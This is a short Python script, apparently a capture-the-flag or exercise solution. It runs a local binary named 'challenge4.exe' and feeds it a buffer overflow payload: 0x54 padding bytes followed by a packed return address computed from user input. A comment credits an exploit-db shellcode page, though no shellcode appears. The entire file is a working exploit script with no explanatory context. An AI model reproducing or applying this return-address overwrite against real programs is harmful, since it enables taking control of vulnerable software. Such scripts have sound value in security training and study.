import subprocess
import sys
import struct

program_path = "./challenge4.exe"
arg = "challenge4m.exe"

cmd = [program_path, arg]
process = subprocess.Popen(cmd, stdin=subprocess.PIPE)

eip = input()
addr = struct.pack('<I', (int(eip,16) + 0x3000))
input_str = ("\x00" * 0x54 + addr)

print(input_str)                 ##This payload I got off https://www.exploit-db.com/shellcodes/48116

process.communicate(input=input_str.encode())
